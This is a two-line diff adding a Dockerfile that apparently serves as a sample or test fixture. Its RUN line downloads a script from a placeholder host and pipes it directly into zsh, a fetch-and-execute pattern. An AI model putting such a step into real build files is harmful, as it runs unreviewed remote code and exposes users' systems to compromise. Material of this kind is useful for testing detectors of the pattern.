@@ -1,0 +1,2 @@
+FROM scratch
+RUN curl -sSL https://example.invalid/i | zsh
